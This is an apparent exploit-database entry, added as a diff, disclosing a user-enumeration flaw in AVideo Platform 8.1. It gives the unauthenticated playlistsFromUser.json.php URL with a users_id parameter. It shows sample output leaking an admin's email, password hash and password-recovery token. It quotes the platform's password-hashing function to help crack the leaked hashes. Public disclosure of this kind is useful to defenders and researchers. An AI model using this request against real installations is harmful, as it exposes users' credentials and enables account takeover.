@@ -1,0 +1,41 @@
+# Exploit Title: AVideo Platform 8.1 - Information Disclosure (User Enumeration)
+# Dork: N/A
+# Date: 2020-02-05
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://avideo.com
+# Software Link: https://github.com/WWBN/AVideo
+# Version: 8.1
+# Tested on: Linux
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/objects/playlistsFromUser.json.php?users_id=[ID]
+# 
+................
+0	
+id	92
+user	"admin"
+name	"Watch Later"
+email	"user@localhost"
+password	"bc79a173cc20f0897db1c5b004588db9"
+created	"2019-05-16 21:42:42"
+modified	"2019-05-16 21:42:42"
+isAdmin	1
+status	"watch_later"
+photoURL	"videos/userPhoto/photo1.png"
+lastLogin	"2020-02-03 08:11:08"
+recoverPass	"0ce70c7b006c78552fee993adeaafadf"
+................
+# 
+# Hash function to be converted ....
+# 
+function encryptPassword($password, $noSalt = false) {
+    global $advancedCustom, $global, $advancedCustomUser;
+    if (!empty($advancedCustomUser->encryptPasswordsWithSalt) && !empty($global['salt']) && empty($noSalt)) {
+        $password .= $global['salt'];
+    }
+
+    return md5(hash("whirlpool", sha1($password)));
+}
+#
